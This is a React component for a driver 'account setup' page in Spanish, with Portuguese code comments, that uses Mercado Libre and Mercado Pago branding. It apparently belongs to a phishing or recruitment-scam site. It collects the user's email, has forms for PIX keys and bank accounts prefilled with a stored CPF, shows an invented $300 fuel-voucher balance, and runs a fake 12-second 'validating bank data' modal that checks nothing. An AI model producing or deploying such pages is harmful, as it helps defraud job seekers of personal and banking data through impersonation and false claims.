import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

// Definindo os schemas e tipos para validação de formulário
const pixSchema = z.object({
  tipoChave: z.enum(['cpf', 'email', 'telefone', 'aleatoria']),
  chave: z.string().min(1, "A chave PIX é obrigatória"),
});

const tedSchema = z.object({
  banco: z.string().min(3, "Banco inválido"),
  agencia: z.string().min(4, "Agência inválida"),
  conta: z.string().min(5, "Conta inválida"),
  tipoConta: z.enum(['corrente', 'poupanca']),
});

type PixFormValues = z.infer<typeof pixSchema>;
type TedFormValues = z.infer<typeof tedSchema>;

// Tipos de método de pagamento
enum MetodoPagamento {
  PIX = 'pix',
  TED = 'ted',
  NENHUM = 'nenhum'
}

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [tieneCuentaML, setTieneCuentaML] = useState<boolean | null>(null);
  const [emailML, setEmailML] = useState('');
  const [metodo, setMetodo] = useState<MetodoPagamento>(MetodoPagamento.NENHUM);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [candidatoData, setCandidatoData] = useState<any>(null);
  
  // Lista dos 6 maiores bancos do Brasil
  const principaisBancos = [
    "Banco do Brasil",
    "Caixa Econômica Federal",
    "Bradesco",
    "Itaú Unibanco",
    "Santander",
    "Nubank"
  ];

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);
  
  // Form para PIX
  const pixForm = useForm<PixFormValues>({
    resolver: zodResolver(pixSchema),
    defaultValues: {
      tipoChave: 'cpf',
      chave: '',
    }
  });

  // Form para TED
  const tedForm = useForm<TedFormValues>({
    resolver: zodResolver(tedSchema),
    defaultValues: {
      banco: principaisBancos[0],
      agencia: '',
      conta: '',
      tipoConta: 'corrente',
    }
  });
  
  // Preencher automaticamente o campo chave PIX quando o tipo de chave muda
  useEffect(() => {
    const tipoChave = pixForm.watch('tipoChave');
    
    if (candidatoData && tipoChave === 'cpf' && candidatoData.cpf) {
      pixForm.setValue('chave', candidatoData.cpf);
    } else if (candidatoData && tipoChave === 'email' && candidatoData.email) {
      pixForm.setValue('chave', candidatoData.email);
    } else if (tipoChave === 'telefone' || tipoChave === 'aleatoria') {
      pixForm.setValue('chave', '');
    }
  }, [pixForm.watch('tipoChave'), candidatoData, pixForm]);

  const handlePixSubmit = (data: PixFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.PIX,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleTedSubmit = (data: TedFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.TED,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    navigate('/finalizacao');
  };

  const getInputMode = (tipoChave: string) => {
    switch (tipoChave) {
      case 'cpf':
      case 'telefone':
        return 'numeric';
      case 'email':
      case 'aleatoria':
      default:
        return 'text';
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      <Breadcrumb />
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          <h1 className="font-bold text-center mb-8 text-gray-800 font-loewe-next-heading text-[24px]">Configuración de Cuenta</h1>
          
          {/* Mercado Libre Account Section */}
          <div className="mb-8 p-8 bg-gradient-to-br from-white via-blue-50/30 to-yellow-50/20 border border-blue-100 rounded-2xl shadow-lg pl-[-4px] pr-[-4px]">
            {/* Header with Mercado Libre Branding */}
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-white rounded-full mb-4 shadow-lg">
                <img 
                  src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png" 
                  alt="Mercado Pago" 
                  className="w-12 h-12 object-contain"
                />
              </div>
              <h2 className="text-2xl font-bold mb-2 text-gray-800 font-loewe-next-heading">Vinculación de Cuenta</h2>
              <p className="text-gray-600 font-loewe-next-body max-w-md mx-auto">Para gestionar tus ganancias como socio conductor, necesitamos vincular tu cuenta de Mercado Pago</p>
            </div>
            
            {/* Account Status Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
              <Card 
                className={`cursor-pointer transition-all duration-300 p-6 hover:shadow-lg ${tieneCuentaML === true ? 'border-[#3483FA] border-2 bg-gradient-to-br from-blue-50 to-blue-100 shadow-blue-100' : 'border-gray-200 hover:border-[#3483FA] hover:shadow-md'}`}
                onClick={() => setTieneCuentaML(true)}
              >
                <div className="flex flex-col items-center text-center space-y-4">
                  <div className="w-12 h-12 bg-[#3483FA] rounded-full flex items-center justify-center text-white shadow-lg">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-bold font-loewe-next-heading text-gray-800">Sí, tengo cuenta</h3>
                    <p className="text-sm text-gray-600 font-loewe-next-body leading-relaxed">
                      Ya soy usuario de Mercado Libre y quiero vincular mi cuenta existente
                    </p>
                  </div>
                  {tieneCuentaML === true && (
                    <div className="w-full pt-2 border-t border-blue-200">
                      <span className="text-xs text-[#3483FA] font-semibold font-loewe-next-body">✓ Seleccionado</span>
                    </div>
                  )}
                </div>
              </Card>
              
              <Card 
                className={`cursor-pointer transition-all duration-300 p-6 hover:shadow-lg ${tieneCuentaML === false ? 'border-[#FEE80D] border-2 bg-gradient-to-br from-yellow-50 to-yellow-100 shadow-yellow-100' : 'border-gray-200 hover:border-[#FEE80D] hover:shadow-md'}`}
                onClick={() => setTieneCuentaML(false)}
              >
                <div className="flex flex-col items-center text-center space-y-4">
                  <div className="w-12 h-12 bg-[#FEE80D] rounded-full flex items-center justify-center text-gray-800 shadow-lg">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"/>
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-bold font-loewe-next-heading text-gray-800">No tengo cuenta</h3>
                    <p className="text-sm text-gray-600 font-loewe-next-body leading-relaxed">
                      Soy nuevo en Mercado Libre y necesito crear una cuenta de socio conductor
                    </p>
                  </div>
                  {tieneCuentaML === false && (
                    <div className="w-full pt-2 border-t border-yellow-200">
                      <span className="text-xs text-[#B8860B] font-semibold font-loewe-next-body">✓ Seleccionado</span>
                    </div>
                  )}
                </div>
              </Card>
            </div>
            
            {/* Email Input Section */}
            {tieneCuentaML !== null && (
              <div className="bg-white p-6 rounded-xl border border-gray-100 shadow-sm ml-[-15px] mr-[-15px] pl-[10px] pr-[10px]">
                <div className="flex items-center mb-4">
                  <h3 className="text-lg font-semibold text-gray-800 font-loewe-next-heading">
                    {tieneCuentaML ? 'Confirma tu email de Mercado Libre' : 'Registra tu email para nueva cuenta'}
                  </h3>
                </div>
                
                <div className="space-y-4">
                  <div>
                    <label htmlFor="emailML" className="block text-base font-medium text-gray-800 mb-2 font-loewe-next-body">
                      Dirección de correo electrónico
                    </label>
                    <Input
                      id="emailML"
                      type="email"
                      value={emailML}
                      onChange={(e) => setEmailML(e.target.value)}
                      placeholder={tieneCuentaML ? 'tu-email@mercadolibre.com' : 'nuevo-email@ejemplo.com'}
                      className="w-full h-12 text-base border-gray-300 focus:border-[#3483FA] focus:ring-[#3483FA]"
                    />
                  </div>
                  
                  <div className="bg-blue-50 p-4 rounded-lg border-l-4 border-[#3483FA]">
                    <div className="flex items-start">
                      <div className="flex-shrink-0">
                        <i className="fas fa-info-circle text-[#3483FA] text-lg mt-0.5"></i>
                      </div>
                      <div className="ml-3">
                        <h4 className="text-sm font-semibold text-gray-800 font-loewe-next-body mb-1">
                          {tieneCuentaML ? 'Vinculación de cuenta existente' : 'Creación de nueva cuenta'}
                        </h4>
                        <p className="text-sm text-gray-700 font-loewe-next-body leading-relaxed">
                          {tieneCuentaML 
                            ? 'Este email se usará para vincular automáticamente tus ganancias de entregas con tu cuenta actual de Mercado Libre. Todos los pagos aparecerán en tu historial financiero.'
                            : 'Crearemos una cuenta de socio conductor especializada con este email. Tendrás acceso completo al panel de ganancias y beneficios exclusivos para conductores.'
                          }
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  {emailML && (
                    <div className="flex items-center text-[#2DB97A] text-sm font-semibold">
                      <i className="fas fa-check-circle mr-2"></i>
                      <span className="font-loewe-next-body">Email válido - Listo para continuar</span>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Financial Dashboard Section */}
          {(tieneCuentaML !== null && emailML) && (
            <div className="mt-8 mb-8">
              <h2 className="text-2xl font-bold text-center mb-6 text-gray-800 font-loewe-next-heading">Panel Financiero</h2>
              
              {/* Vale Combustible Description */}
              <div className="max-w-2xl mx-auto mb-6 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-lg border border-blue-200">
                <div className="flex items-center mb-3">
                  <div className="w-8 h-8 bg-[#3483FA] rounded-full flex items-center justify-center mr-3">
                    <i className="fas fa-gas-pump text-white text-sm"></i>
                  </div>
                  <h3 className="text-lg font-semibold text-gray-800 font-loewe-next-heading">Vale Combustible Incluido</h3>
                </div>
                <p className="text-gray-700 text-sm leading-relaxed font-loewe-next-body">
                  Como nuevo socio conductor, recibes un <strong>vale combustible promocional de $300</strong> para comenzar tus entregas. 
                  Este beneficio único se refleja automáticamente en tu saldo disponible y puedes utilizarlo en cualquier estación de servicio afiliada.
                </p>
                <div className="mt-3 flex items-center text-[#2DB97A] text-sm font-semibold">
                  <i className="fas fa-check-circle mr-2"></i>
                  <span className="font-loewe-next-body">Beneficio activo - Válido por 10 días</span>
                </div>
              </div>
              
              {/* Financial Dashboard Component */}
              <div className="flex items-center justify-center p-4">
                <div className="relative w-full max-w-[420px] h-auto flex items-center justify-center">
                  {/* Blue Circle Background */}
                  <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-[120%] h-[320px] bg-[#1DC6FF] rounded-full z-0"></div>
                  
                  {/* Card Container */}
                  <div className="relative w-full bg-white rounded-[36px] shadow-xl z-10 pt-6 pb-6 px-4 sm:px-6">
                    {/* Saldo Card */}
                    <div className="bg-white rounded-2xl pt-4 pb-4 px-4 sm:px-6 shadow mb-4" style={{boxShadow: '0 2px 16px 0 rgba(0,0,0,0.04)'}}>
                      <div className="flex items-center justify-between">
                        <span className="text-[#222] text-sm sm:text-base font-normal font-loewe-next-body">Saldo</span>
                        <span className="ml-2 px-2 py-0.5 rounded-full bg-[#E7F9EF] text-[#2DB97A] text-xs font-semibold flex items-center font-loewe-next-body">
                          <i className="fas fa-caret-up mr-1"></i> Rindiendo
                        </span>
                      </div>
                      <div className="flex items-center mt-2">
                        <span className="text-[#222] text-2xl sm:text-3xl font-bold tracking-tight font-loewe-next-heading">$300</span>
                        <span className="ml-4">
                          <i className="far fa-eye text-[#C4C4C4] text-xl"></i>
                        </span>
                      </div>
                      
                    </div>
                    
                    {/* Reservas Card */}
                    <div className="bg-white rounded-2xl shadow flex items-center px-4 sm:px-6 py-4 mb-4" style={{boxShadow: '0 2px 16px 0 rgba(0,0,0,0.08)'}}>
                      <div className="flex-shrink-0">
                        <div className="w-8 h-8 flex items-center justify-center bg-[#F3F3F3] rounded-full">
                          <i className="fas fa-piggy-bank text-[#222] text-lg"></i>
                        </div>
                      </div>
                      <div className="ml-4 flex-1">
                        <div className="flex items-center">
                          <span className="text-[#222] text-base sm:text-lg font-semibold font-loewe-next-heading">Reservas financieras</span>
                        </div>
                        <div className="flex items-center mt-1">
                          <span className="text-[#222] text-xl sm:text-2xl font-bold font-loewe-next-heading">$0</span>
                          <span className="ml-3 px-2 py-0.5 rounded-full bg-[#E7F9EF] text-[#2DB97A] text-xs font-semibold flex items-center font-loewe-next-body">
                            <i className="fas fa-caret-up mr-1"></i> Rindiendo
                          </span>
                        </div>
                      </div>
                      <div>
                        <i className="fas fa-chevron-right text-[#1DC6FF] text-lg"></i>
                      </div>
                    </div>
                    
                    {/* Ingresos Card */}
                    <div className="bg-white rounded-2xl shadow flex items-center px-4 sm:px-6 py-4" style={{boxShadow: '0 2px 16px 0 rgba(0,0,0,0.08)'}}>
                      <div className="flex-shrink-0">
                        <div className="w-8 h-8 flex items-center justify-center bg-[#F3F3F3] rounded-full">
                          <i className="fas fa-chart-bar text-[#222] text-lg"></i>
                        </div>
                      </div>
                      <div className="ml-4 flex-1">
                        <div className="flex items-center">
                          <span className="text-[#222] text-base sm:text-lg font-semibold font-loewe-next-heading">Ingresos</span>
                        </div>
                        <div className="flex items-center mt-1">
                          <span className="text-[#222] text-xl sm:text-2xl font-bold font-loewe-next-heading">$0</span>
                          <span className="ml-3 px-2 py-0.5 rounded-full bg-[#E7F9EF] text-[#2DB97A] text-xs font-semibold flex items-center font-loewe-next-body">
                            <i className="fas fa-caret-up mr-1"></i> Rindiendo
                          </span>
                        </div>
                      </div>
                      <div>
                        <i className="fas fa-chevron-right text-[#1DC6FF] text-lg"></i>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Continue Button - Only show when email is added */}
          {(tieneCuentaML !== null && emailML) && (
            <div className="flex justify-center mt-8 mb-8">
              <Button
                onClick={() => window.location.href = '/finalizacao'}
                className="w-full max-w-md bg-[#3483FA] hover:bg-[#2968c8] text-white font-semibold py-4 text-lg rounded-lg font-loewe-next-body transition-colors duration-200"
                style={{ height: '56px' }}
              >
                Continuar al siguiente paso
                <i className="fas fa-arrow-right ml-2"></i>
              </Button>
            </div>
          )}
        </div>
      </div>
      <Footer />
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Procesando Información"
        loadingSteps={[
          "Validando datos bancarios",
          "Registrando método de pago",
          "Configurando cuenta para pagos",
          "Verificando seguridad de la información",
          "Completando registro financiero"
        ]}
        completionMessage="¡Método de pago registrado con éxito!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Recebedor;